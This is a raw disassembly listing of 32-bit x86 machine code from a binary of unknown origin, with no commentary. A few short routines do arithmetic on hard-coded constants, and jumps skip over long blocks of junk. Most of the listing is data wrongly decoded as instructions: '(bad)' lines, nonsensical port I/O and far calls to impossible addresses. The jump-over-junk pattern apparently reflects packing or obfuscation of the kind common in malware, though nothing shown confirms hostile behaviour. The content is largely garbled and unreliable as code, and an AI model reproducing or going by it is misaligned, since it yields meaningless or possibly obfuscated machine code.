  412760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412761:	(bad)  
  412762:	cs in  eax,dx
  412764:	xor    esi,esp
  412766:	out    0x13,eax
  412768:	inc    ebp
  412769:	add    dh,BYTE PTR [ecx]
  41276b:	jne    0x4126f9
  41276d:	mov    edx,0xad8370f2
  412772:	out    0xd4,eax
  412774:	aas    
  412775:	arpl   WORD PTR [ecx],dx
  412777:	iret   
  412778:	mov    ebp,edx
  41277a:	push   ss
  41277b:	xor    dh,BYTE PTR [ebp+0x40d67fb8]
  412781:	ins    BYTE PTR es:[edi],dx
  412782:	adc    BYTE PTR [edi],ah
  412784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412785:	idiv   BYTE PTR [ecx+0x16]
  412788:	int3   
  412789:	push   esi
  41278a:	lods   eax,DWORD PTR ds:[esi]
  41278b:	popf   
  41278c:	clc    
  41278d:	lods   eax,DWORD PTR ds:[esi]
  41278e:	test   al,0x57
  412790:	retf   0x7a19
  412793:	mov    esi,0x8c2e416e
  412798:	mov    ecx,0xc21bf8d1
  41279d:	mov    edx,DWORD PTR ds:0x42263c
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x42263c
  4127d5:	mov    ds:0x422644,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0x6a39767e
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    dh,ah
  4128b3:	data16 mov fs,WORD PTR [esi]
  4128b6:	arpl   WORD PTR [ebp-0xe],si
  4128b9:	imul   esi,DWORD PTR ds:0xac00d346,0x488b728d
  4128c3:	ja     0x412932
  4128c5:	xchg   DWORD PTR [eax-0x41],edi
  4128c8:	and    al,0xd7
  4128ca:	adc    ebp,edx
  4128cc:	loopne 0x4128a3
  4128ce:	out    0x2c,al
  4128d0:	fwait
  4128d1:	mov    bl,0x75
  4128d3:	push   ds
  4128d4:	mov    bh,BYTE PTR gs:[ecx]
  4128d7:	cli    
  4128d8:	cmc    
  4128d9:	push   edi
  4128da:	pop    esi
  4128db:	and    BYTE PTR [ecx-0x5280fb3e],ah
  4128e1:	lock arpl bx,ax
  4128e4:	sbb    DWORD PTR [esi],0xbad67ce7
  4128ea:	xchg   esp,eax
  4128eb:	cmp    DWORD PTR [esi+0x27],ecx
  4128ee:	cmovs  ebp,esp
  4128f1:	stos   BYTE PTR es:[edi],al
  4128f2:	mov    al,0xc8
  4128f4:	xchg   edi,eax
  4128f5:	dec    ecx
  4128f6:	pop    edx
  4128f7:	pusha  
  4128f8:	push   eax
  4128f9:	jnp    0x4128c4
  4128fb:	pop    esi
  4128fc:	ss cmc 
  4128fe:	cmp    BYTE PTR [eax-0x27f48af9],bl
  412904:	mov    eax,0x94400c65
  412909:	nop
  41290a:	dec    esi
  41290b:	rcl    DWORD PTR [ebp+0x6f431439],0xd7
  412912:	repnz pop eax
  412914:	daa    
  412915:	loopne 0x4128ca
  412917:	xor    DWORD PTR [esi],eax
  412919:	outs   dx,BYTE PTR ds:[esi]
  41291a:	mov    bh,0xdb
  41291c:	stos   BYTE PTR es:[edi],al
  41291d:	cli    
  41291e:	(bad)  
  41291f:	jecxz  0x412972
  412921:	xchg   ecx,eax
  412922:	je     0x41296b
  412924:	sub    DWORD PTR [edx],ebp
  412926:	and    esi,DWORD PTR [ebx+0x48d6ab91]
  41292c:	pop    eax
  41292d:	mov    ebx,0x82f4f1f1
  412932:	enter  0x56cd,0xc
  412936:	frstor [edi]
  412938:	mov    bh,0x8c
  41293a:	jp     0x412986
  41293c:	dec    ebp
  41293d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41293e:	cmp    ah,dh
  412940:	and    al,0xfe
  412942:	mov    ebx,0xff2751d3
  412947:	sti    
  412948:	repz mov ch,0x51
  41294b:	fwait
  41294c:	and    esi,DWORD PTR [edi-0x5c]
  41294f:	mov    bh,0xf0
  412951:	cmp    ch,BYTE PTR [edx-0x4e]
  412954:	lods   eax,DWORD PTR ds:[esi]
  412955:	and    al,0x1d
  412957:	popa   
  412958:	push   esp
  412959:	mov    ebx,0xf99ee736
  41295e:	sbb    al,0x9
  412960:	push   esi
  412961:	sub    BYTE PTR [eax],al
  412963:	arpl   WORD PTR [edi+0x2],bp
  412966:	push   eax
  412967:	sub    eax,0x23f5db45
  41296c:	sbb    ebx,DWORD PTR [esi]
  41296e:	add    ebx,DWORD PTR [edi]
  412970:	mov    esi,fs
  412972:	gs push 0x73aca9f5
  412978:	push   0x55
  41297a:	cwde   
  41297b:	call   0xa9c0:0xb63cf7da
  412982:	pop    eax
  412983:	repnz aaa 
  412985:	pop    esp
  412986:	jbe    0x4129cb
  412988:	mov    ch,0xdd
  41298a:	aaa    
  41298b:	into   
  41298c:	mov    edi,0xad1ecf8c
  412991:	into   
  412992:	sti    
  412993:	lahf   
  412994:	lods   eax,DWORD PTR ds:[esi]
  412995:	inc    edx
  412996:	push   edx
  412997:	push   esp
  412998:	repz shl ecx,cl
  41299b:	mov    bh,0x81
  41299d:	xchg   DWORD PTR [eax+0x14],esi
  4129a0:	sbb    edx,0xffffff85
  4129a3:	mov    ?,esi
  4129a5:	call   0x23f4ca55
  4129aa:	cs popa 
  4129ac:	leave  
  4129ad:	jns    0x412947
  4129af:	fst    DWORD PTR [esi+esi*1-0x554ab5c4]
  4129b6:	sbb    edx,DWORD PTR [esi-0x7f]
  4129b9:	cli    
  4129ba:	test   al,0xb4
  4129bc:	pop    esp
  4129bd:	mov    ecx,0x2977a1d7
  4129c2:	and    ch,BYTE PTR ds:0x86568efb
  4129c8:	pop    ds
  4129c9:	jo     0x412a46
  4129cb:	popa   
  4129cc:	stos   DWORD PTR es:[edi],eax
  4129cd:	fisubr WORD PTR [edi-0x40b42810]
  4129d3:	sbb    BYTE PTR [esi],0x25
  4129d6:	dec    ecx
  4129d7:	xchg   edi,eax
  4129d8:	dec    edx
  4129d9:	cmp    dh,bh
  4129db:	(bad)  [eax+0x3f5fbc97]
  4129e1:	cmp    DWORD PTR [ecx+esi*8-0x80],0x24817439
  4129e9:	cld    
  4129ea:	adc    esp,DWORD PTR [eax]
  4129ec:	aam    0x16
  4129ee:	and    DWORD PTR [eax+ecx*8-0x62],ecx
  4129f2:	cmp    edi,edx
  4129f4:	mov    cl,0xdd
  4129f6:	pop    ebp
  4129f7:	xor    DWORD PTR [ebx+0x64be71c0],edi
  4129fd:	cli    
  4129fe:	cdq    
  4129ff:	daa    
  412a00:	and    eax,0x3459925e
  412a05:	in     al,0x72
  412a07:	and    al,0xa4
  412a09:	cmp    esp,DWORD PTR [esi+eax*8+0x51]
  412a0d:	xchg   ebx,eax
  412a0e:	xchg   esi,eax
  412a0f:	aaa    
  412a10:	sbb    DWORD PTR [edi+0x3e],0x29af377e
  412a17:	je     0x412a26
  412a19:	mov    WORD PTR [eax],ds
  412a1b:	jbe    0x4129f1
  412a1d:	imul   eax,DWORD PTR [ebx+ebx*1-0x57],0x344445cb
  412a25:	jp     0x412a0b
  412a27:	pop    ds
  412a28:	push   ss
  412a29:	add    BYTE PTR [ebp+0x3],ah
  412a2c:	scas   eax,DWORD PTR es:[edi]
  412a2d:	xchg   esi,eax
  412a2e:	mov    edi,0x5bf93aaa
  412a33:	aam    0xc1
  412a35:	mov    ch,BYTE PTR [edx]
  412a37:	cli    
  412a38:	mov    ebx,0x1cd8b059
  412a3d:	cmp    dl,BYTE PTR [edx+ecx*8+0x4e]
  412a41:	xor    ecx,DWORD PTR [ebx-0x45]
  412a44:	sbb    eax,0x2e22c674
  412a49:	xor    eax,0x4fc3266e
  412a4e:	es mov cl,0x98
  412a51:	out    dx,al
  412a52:	pop    es
  412a53:	pop    esp
  412a54:	mov    ds:0xef77d185,al
  412a59:	dec    esp
  412a5a:	sbb    eax,0xd2acb9e2
  412a5f:	(bad)  
  412a60:	jl     0x412ade
  412a62:	push   es
  412a63:	or     dl,BYTE PTR [eax+0x66f296ab]
  412a69:	xor    bl,BYTE PTR [edi+0xb567afa]
  412a6f:	dec    esi
  412a70:	add    al,0x19
  412a73:	inc    esp
  412a74:	out    dx,eax
  412a75:	pop    ss
  412a76:	jg     0x412ae7
  412a78:	mov    eax,0xd780d492
  412a7d:	mov    ch,0x9e
  412a7f:	inc    eax
  412a80:	outs   dx,BYTE PTR ds:[esi]
  412a81:	sub    eax,0x50b3961d
  412a86:	bound  ebp,QWORD PTR [ecx+0x2729a1e9]
  412a8c:	jo     0x412aaf
  412a8e:	sbb    al,0xe
  412a90:	and    ebp,DWORD PTR [esi-0x17]
  412a93:	jo     0x412ac0
  412a95:	shr    BYTE PTR ds:0x27ffba95,0xd2
  412a9c:	fs or  cl,ah
  412a9f:	adc    cl,dl
  412aa1:	daa    
  412aa2:	and    BYTE PTR [ebx-0x32],ch
  412aa5:	jne    0x412ab4
  412aa7:	inc    ebx
  412aa8:	inc    edx
  412aa9:	imul   eax,edx,0xffffffed
  412aac:	test   DWORD PTR [edi],ebx
  412aae:	stos   WORD PTR es:[edi],ax
  412ab0:	(bad)  
  412ab1:	sbb    DWORD PTR [eax-0x570d1c8b],0x24482bc8
  412abb:	loop   0x412a3d
  412abd:	dec    esi
  412abe:	test   ah,dh
  412ac0:	sbb    dl,BYTE PTR [eax+0x15]
  412ac3:	push   ds
  412ac4:	jns    0x412ab8
  412ac6:	jno    0x412b00
  412ac8:	mov    edi,0x52fedcb8
  412acd:	stos   BYTE PTR es:[edi],al
  412ace:	push   ebx
  412acf:	dec    BYTE PTR [ebx]
  412ad1:	es test al,0x55
  412ad4:	(bad)  
  412ad5:	in     al,dx
  412ad6:	aaa    
  412ad7:	cld    
  412ad8:	pop    ebp
  412ad9:	ret    0x5684
  412adc:	test   al,0x78
  412ade:	jno    0x412a7c
  412ae0:	loopne 0x412a6c
  412ae2:	sbb    BYTE PTR [ebp-0x59],bh
  412ae5:	cmp    dh,BYTE PTR [ebp+0x3a0e9f4a]
  412aeb:	out    0x81,al
  412aed:	cli    
  412aee:	mov    ah,0x82
  412af0:	push   edi
  412af1:	out    dx,eax
  412af2:	jno    0x412a7c
  412af4:	add    DWORD PTR [ebp+0xd],eax
  412af7:	and    esi,DWORD PTR [ebx+0x68]
  412afa:	sub    eax,0x788e47c2
  412aff:	xor    al,0x82
  412b01:	mov    dh,0xea
  412b03:	js     0x412ad6
  412b05:	add    eax,0x8823603a
  412b0a:	leave  
  412b0b:	mov    edi,0x1edd1d79
  412b10:	inc    ecx
  412b11:	dec    esp
  412b12:	mov    bh,0x67
  412b14:	addr16 iret 
  412b16:	fistp  DWORD PTR [ebp-0x14]
  412b19:	fstp   TBYTE PTR [ecx-0x7cf96bd2]
  412b1f:	dec    edx
  412b20:	mov    ds:0xc531f8ac,eax
  412b25:	cmp    al,0x32
  412b27:	aam    0x5d
  412b29:	outs   dx,DWORD PTR ds:[esi]
  412b2a:	xchg   esp,eax
  412b2b:	mov    eax,DWORD PTR [ebp-0x3f]
  412b2e:	in     eax,0xf1
  412b30:	xchg   edx,eax
  412b31:	dec    ebp
  412b32:	pushf  
  412b33:	test   DWORD PTR [eax],ecx
  412b35:	(bad)  
  412b36:	ficomp DWORD PTR [edx-0xd5a732c]
  412b3c:	mov    dh,0xcb
  412b3e:	ins    DWORD PTR es:[edi],dx
  412b3f:	call   0x1f0222a2
  412b44:	jg     0x412ace
  412b46:	push   ebx
  412b47:	not    BYTE PTR [edi+0x67c99065]
  412b4d:	xor    DWORD PTR [edi+0x78],esp
  412b50:	scas   eax,DWORD PTR es:[edi]
  412b51:	scas   eax,DWORD PTR es:[edi]
  412b52:	pop    ss
  412b53:	pop    edi
  412b54:	xchg   esi,eax
  412b55:	adc    BYTE PTR [esp+ecx*1-0x7a],ah
  412b59:	out    dx,al
  412b5a:	inc    ecx
  412b5b:	aas    
  412b5c:	scas   al,BYTE PTR es:[edi]
  412b5d:	push   0x79
  412b5f:	and    BYTE PTR [ecx],dl
  412b61:	out    0x4c,eax
  412b63:	mov    esp,DWORD PTR [ecx]
  412b65:	int3   
  412b66:	cmp    eax,0xdb14ef4a
  412b6b:	mov    DWORD PTR [ebp+0xc3dc180],esp
  412b71:	ret    0x75d3
  412b74:	jb     0x412b5e
  412b76:	xchg   ebp,eax
  412b77:	mov    bl,0x6c
  412b79:	xlat   BYTE PTR ds:[ebx]
  412b7a:	fwait
  412b7b:	cmp    eax,DWORD PTR [edx]
  412b7d:	scas   al,BYTE PTR es:[edi]
  412b7e:	ins    DWORD PTR es:[edi],dx
  412b7f:	cmp    ebp,0xf
  412b82:	mov    dl,0x65
  412b84:	jnp    0x412b7f
  412b86:	or     ecx,DWORD PTR [ecx+0x16]
  412b89:	dec    edi
  412b8a:	daa    
  412b8b:	jo     0x412bcb
  412b8d:	loopne 0x412b32
  412b8f:	test   eax,0xb879546a
  412b94:	push   ebx
  412b95:	fcmovnu st,st(0)
  412b97:	mov    ds:0x87afee80,al
  412b9c:	aas    
  412b9d:	fsub   st,st(6)
  412b9f:	repnz or DWORD PTR [edi+edx*8-0x2079c3d0],ecx
  412ba7:	xlat   BYTE PTR gs:[ebx]
  412ba9:	(bad)  
  412baa:	push   ss
  412bab:	dec    ebx
  412bac:	fdivr  QWORD PTR [edx]
  412bae:	in     al,0x79
  412bb0:	loop   0x412bf8
  412bb2:	adc    al,0x77
  412bb4:	pop    edi
  412bb5:	outs   dx,BYTE PTR ds:[esi]
  412bb6:	jmp    0x5ee6d44d
  412bbb:	fldcw  WORD PTR [eax+ebp*8]
  412bbe:	mov    esp,0x41f02eff
  412bc3:	out    dx,al
  412bc4:	iret   
  412bc5:	das    
  412bc6:	not    eax
  412bc8:	mov    edx,0xc643f696
  412bcd:	or     eax,0xadfc2a1a
  412bd2:	xlat   BYTE PTR ds:[ebx]
  412bd3:	mov    bl,0x24
  412bd5:	or     eax,0xd3f6e141
  412bda:	psadbw mm6,mm1
  412bdd:	es pop es
  412bdf:	(bad)  
  412be0:	outs   dx,BYTE PTR ds:[esi]
  412be1:	mov    DWORD PTR [eax-0x4c],ebp
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	and    ch,BYTE PTR [edi-0x56]
  412be8:	repnz pop ss
  412bea:	dec    ebp
  412beb:	sti    
  412bec:	add    BYTE PTR [edi],ah
  412bee:	mov    dl,0x27
  412bf0:	scas   al,BYTE PTR es:[edi]
  412bf1:	adc    esi,DWORD PTR [eax]
  412bf3:	jmp    0xd58cede
  412bf8:	mov    al,ds:0x69574b97
  412bfd:	cwde   
  412bfe:	xchg   ebx,eax
  412bff:	cdq    
  412c00:	mov    esi,0x51c516ad
  412c05:	push   ebp
  412c06:	cmc    
  412c07:	dec    ebx
  412c08:	push   es
  412c09:	and    DWORD PTR [edi-0x71],esi
  412c0c:	xadd   BYTE PTR [edx],dl
  412c0f:	jnp    0x412c2e
  412c11:	pop    eax
  412c12:	scas   eax,DWORD PTR es:[edi]
  412c13:	icebp  
  412c14:	inc    ecx
  412c15:	jb     0x412c10
  412c17:	sub    BYTE PTR [ecx-0x770e80b7],dh
  412c1d:	xor    ecx,ecx
  412c1f:	(bad)
  412c22:	push   0xffffffcf
  412c24:	push   ss
  412c25:	int3   
  412c26:	sbb    eax,DWORD PTR [eax-0x59e3147f]
  412c2c:	test   DWORD PTR [edx+ebp*2+0x2c0b2f81],ebx
  412c33:	or     eax,0xf363e318
  412c38:	lock retf 
  412c3a:	call   0x5f5fb7f7
  412c3f:	mov    ds:0x1d7bb4bc,eax
  412c44:	(bad)  
  412c45:	sbb    al,BYTE PTR [eax]
  412c47:	jne    0x412c38
  412c49:	ror    DWORD PTR [edx-0x30317e49],0xc3
  412c50:	int3   
  412c51:	adc    ebp,edx
  412c53:	ret    
  412c54:	jg     0x412c10
  412c56:	or     eax,0x56ea516d
  412c5b:	jne    0x412cc5
  412c5d:	sbb    dh,BYTE PTR [ebp+ebx*8+0x2a45ed38]
  412c64:	lahf   
  412c65:	mov    esp,DWORD PTR [edi+0x3c764418]
  412c6b:	in     al,0xd0
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xbefe2a87
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [ecx],cl
  412cae:	xchg   ebx,eax
  412caf:	mov    bh,0xf8
  412cb1:	lea    ebx,[esi+0x92d70f1]
  412cb7:	mov    ecx,0x525bb0b9
  412cbc:	inc    eax
  412cbd:	add    BYTE PTR [edx+0x6f3dba58],dh
  412cc3:	fisubr WORD PTR [edi]
  412cc5:	into   
  412cc6:	adc    bh,ch
  412cc8:	dec    ecx
  412cc9:	out    0x21,eax
  412ccb:	(bad)  
  412ccc:	xor    edi,esp
  412cce:	push   0xffffffac
  412cd0:	xchg   BYTE PTR [edi+esi*8+0x529d6bd6],dl
  412cd7:	fst    DWORD PTR [edi]
  412cd9:	push   ds
  412cda:	outs   dx,BYTE PTR ds:[esi]
  412cdb:	jmp    0xdf1be3e9
  412ce0:	mov    dh,0x72
  412ce2:	in     al,0x76
  412ce4:	out    0x3d,eax
  412ce6:	mov    ebx,0x972cf607
  412ceb:	adc    DWORD PTR [edi+0xa],ebp
  412cee:	xor    dl,BYTE PTR [eax-0x56]
  412cf1:	test   BYTE PTR [edx+0x241fd4f7],al
  412cf7:	pop    eax
  412cf8:	(bad)  
  412cf9:	ftst   
  412cfb:	fsubr  DWORD PTR [edi-0x5d78b7f4]
  412d01:	hlt    
  412d02:	sub    BYTE PTR [edx],0x15
  412d05:	jb     0x412cfa
  412d07:	jge    0x412d3f
  412d09:	mov    esp,0xaa49a0ee
  412d0e:	dec    edi
  412d0f:	jbe    0x412d5b
  412d11:	xor    eax,0x371993f7
  412d16:	rol    BYTE PTR [eax+0x433cf8ba],cl
  412d1c:	arpl   WORD PTR [ebp-0x74],ax
  412d1f:	sbb    al,0xf9
  412d21:	pop    ds
  412d22:	and    bh,BYTE PTR [ebx+eax*1-0x48fca34a]
  412d29:	xor    eax,0x7756b0b8
  412d2e:	ret    0x83ef
  412d31:	(bad)  
  412d32:	adc    bl,ah
  412d34:	adc    BYTE PTR [esi+0x45],ch
  412d37:	aam    0x83
  412d39:	jb     0x412daf
  412d3b:	pop    ds
  412d3c:	sub    ecx,DWORD PTR [edi+0x32]
  412d3f:	enter  0xd184,0x7e
  412d43:	adc    cl,ch
  412d45:	popa   
  412d46:	ins    BYTE PTR es:[edi],dx
  412d47:	in     al,dx
  412d48:	inc    edi
  412d49:	sar    DWORD PTR [edx],1
  412d4b:	fmul   st,st(2)
  412d4d:	call   0x12510bd3
  412d52:	xchg   edx,eax
  412d53:	lods   eax,DWORD PTR ds:[esi]
  412d54:	pop    ebp
  412d55:	cmp    ebp,ebx
  412d57:	cmp    DWORD PTR [edx+0x448b9504],eax
  412d5d:	or     cl,cl
  412d5f:	push   ebp
  412d60:	xor    DWORD PTR [edi],ebx
  412d62:	xor    DWORD PTR [edx+0x50192893],eax
  412d68:	and    dh,dh
  412d6a:	pop    esi
  412d6b:	inc    edi
  412d6c:	xor    DWORD PTR [edx],0x44
  412d6f:	stos   DWORD PTR es:[edi],eax
  412d70:	push   esp
  412d71:	ins    DWORD PTR es:[edi],dx
  412d72:	pop    es
  412d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d74:	inc    edx
  412d75:	lock mov dl,0x30
  412d78:	fs (bad) 
  412d7a:	and    al,0x9f
  412d7c:	dec    esp
  412d7d:	jno    0x412d14
  412d7f:	jp     0x412dc3
  412d81:	pop    edx
  412d82:	push   ss
  412d83:	loope  0x412df5
  412d85:	cmp    BYTE PTR [ebx+0x516c674c],0x72
  412d8c:	sub    bh,al
  412d8e:	(bad)  
  412d8f:	or     ch,BYTE PTR [esi-0x1b]
  412d92:	scas   eax,DWORD PTR es:[edi]
  412d93:	idiv   BYTE PTR [esi]
  412d95:	sbb    cl,0x8b
  412d98:	dec    edi
  412d99:	push   0x6e08a5a2
  412d9e:	sub    bl,BYTE PTR [edx]
  412da0:	scas   al,BYTE PTR es:[edi]
  412da1:	imul   BYTE PTR fs:[edx]
  412da4:	dec    eax
  412da5:	inc    edi
  412da6:	mov    esi,0xdd8de17e
  412dab:	and    bh,BYTE PTR [edi]
  412dad:	bound  esi,QWORD PTR ds:0x7396d22b
  412db3:	or     al,0x34
  412db5:	nop
  412db6:	jb     0x412d39
  412db8:	cmp    BYTE PTR [ebx-0x359cdbe3],cl
  412dbe:	mov    cs,WORD PTR [ebx-0x4bd4a1c0]
  412dc4:	pusha  
  412dc5:	sbb    al,0xdf
  412dc7:	sub    BYTE PTR [ecx-0x63],al
  412dca:	xchg   esi,eax
  412dcb:	add    BYTE PTR [ecx-0x6a],ah
  412dce:	ret    0xd9ff
  412dd1:	jbe    0x412d97
  412dd3:	mov    bl,0xef
  412dd5:	das    
  412dd6:	retf   
  412dd7:	mov    dl,BYTE PTR [eax+0x1f73f300]
  412ddd:	popa   
  412dde:	outs   dx,DWORD PTR ds:[esi]
  412ddf:	test   BYTE PTR [ebx-0x52df1de9],ah
  412de5:	retf   0xa229
  412de8:	mov    ebp,0xcad6b00e
  412ded:	aam    0x40
  412def:	pop    ds
  412df0:	scas   eax,DWORD PTR es:[edi]
  412df1:	aaa    
  412df2:	jo     0x412e0c
  412df4:	mov    dl,0x5e
  412df6:	iret   
  412df7:	mov    dl,0xce
  412df9:	push   0x76
  412dfb:	inc    ebp
  412dfc:	sub    BYTE PTR [ecx],ch
  412dfe:	push   ebp
  412dff:	or     bh,BYTE PTR [edi+0xce65c0]
  412e05:	cdq    
  412e06:	add    DWORD PTR [ebx+esi*8+0x29a811d0],esp
  412e0d:	sti    
  412e0e:	jmp    0xaed7:0x2d18882d
  412e15:	(bad)  
  412e16:	pop    edx
  412e17:	and    edx,DWORD PTR [ebx+0x78]
  412e1a:	int    0x75
  412e1c:	push   eax
  412e1d:	loopne 0x412e0a
  412e1f:	inc    ebx
  412e20:	div    esi
  412e22:	mov    ch,0x65
  412e24:	gs imul DWORD PTR cs:[ecx+eax*8-0x6360e152]
  412e2d:	pop    ebx
  412e2e:	out    dx,al
  412e2f:	fwait
  412e30:	vpmullw ymm0,ymm7,YMMWORD PTR [ebp-0x42beaeb2]
  412e38:	inc    esp
  412e39:	fnsave [edi+0xc1d9498]
  412e3f:	cmp    al,0x39
  412e41:	push   0x15
  412e43:	pop    edx
  412e44:	mov    esp,0x3a555338
  412e49:	jo     0x412df8
  412e4b:	cmp    edx,edx
  412e4d:	nop
  412e4e:	dec    esp
  412e4f:	clc    
  412e50:	out    0xe8,al
  412e52:	push   ebx
  412e53:	jp     0x412e7f
  412e55:	jno    0x412ebe
  412e57:	fcom   QWORD PTR [ebp+0x7b3c04d6]
  412e5d:	mov    ds:0xa10a9fe8,al
  412e62:	(bad)  
  412e63:	in     eax,0xf8
  412e65:	sar    BYTE PTR [ebx-0x77],0x29
  412e69:	lds    edx,FWORD PTR [edx+ebp*4]
  412e6c:	mov    al,0x6e
  412e6e:	sub    ebx,DWORD PTR [eax-0x22416433]
  412e74:	or     ah,BYTE PTR [edx-0x5804af1d]
  412e7a:	xchg   ecx,eax
  412e7b:	int    0x39
  412e7d:	sbb    edi,edi
  412e7f:	jae    0x412ef5
  412e81:	lods   eax,DWORD PTR ds:[esi]
  412e82:	popa   
  412e83:	fisttp QWORD PTR [edi-0x53be4b89]
  412e89:	neg    al
  412e8b:	adc    dh,BYTE PTR [ecx]
  412e8d:	pop    ss
  412e8e:	leave  
  412e8f:	pop    ds
  412e90:	pop    esp
  412e91:	push   ebp
  412e92:	pop    ss
  412e93:	aas    
  412e94:	cmp    eax,0x398ce753
  412e99:	out    dx,al
  412e9a:	xor    esp,DWORD PTR [edx-0x6e0e4202]
  412ea0:	inc    edi
  412ea1:	cmp    eax,DWORD PTR [ecx-0x5f9a1ffa]
  412ea7:	in     al,dx
  412ea8:	mov    eax,ds:0x1bea88a3
  412ead:	aas    
  412eae:	xchg   DWORD PTR [edi-0x7f],ebp
  412eb1:	lods   eax,DWORD PTR ds:[esi]
  412eb2:	ja     0x412e4c
  412eb4:	or     eax,0xb0d93385
  412eb9:	xchg   edx,eax
  412eba:	jne    0x412e67
  412ebc:	loope  0x412eea
  412ebe:	jno    0x412f20
  412ec0:	cmp    al,0xb8
  412ec2:	(bad)  
  412ec3:	mov    ebx,0x6ddc6f88
  412ec8:	arpl   WORD PTR [esi],di
  412eca:	pop    edi
  412ecb:	mov    esi,0x150e2e85
  412ed0:	push   ds
  412ed1:	daa    
  412ed2:	mov    ds:0x9b2aa79c,eax
  412ed7:	mov    edx,ecx
  412ed9:	push   ecx
  412eda:	nop
  412edb:	cli    
  412edc:	inc    ebp
  412edd:	and    esi,DWORD PTR [edi-0x78]
  412ee0:	fs stc 
  412ee2:	jno    0x412f13
  412ee4:	in     al,0xcc
  412ee6:	out    0xf9,eax
  412ee8:	arpl   di,dx
  412eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eeb:	jo     0x412f17
  412eed:	push   ebx
  412eee:	pop    ds
  412eef:	cs repz aam 0x90
  412ef3:	push   esi
  412ef4:	add    edx,DWORD PTR [esp+ecx*8-0x13db14d4]
  412efb:	in     eax,0xef
  412efd:	cmc    
  412efe:	jp     0x412f4c
  412f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f01:	pop    ebx
  412f02:	retf   0x29b4
  412f05:	out    0xc8,al
  412f07:	or     cl,0x81
  412f0a:	lods   al,BYTE PTR ds:[esi]
  412f0b:	add    BYTE PTR ds:0xb9e9cffa,dl
  412f11:	(bad)  
  412f12:	(bad)  
  412f13:	adc    DWORD PTR [edx],eax
  412f15:	push   edx
  412f16:	mov    eax,ds:0xf21cc6ed
  412f1b:	push   0x7c2d55b4
  412f20:	jbe    0x412f00
  412f22:	es push 0x4
  412f25:	fadd   DWORD PTR [ebp-0x1b]
  412f28:	mov    edi,0xe8d6eaa2
  412f2d:	loop   0x412ee4
  412f2f:	cmp    al,0x53
  412f31:	sub    BYTE PTR [ebx],ch
  412f33:	enter  0x54f8,0xfb
  412f37:	xchg   edx,eax
  412f38:	lods   al,BYTE PTR ds:[esi]
  412f39:	jne    0x412f61
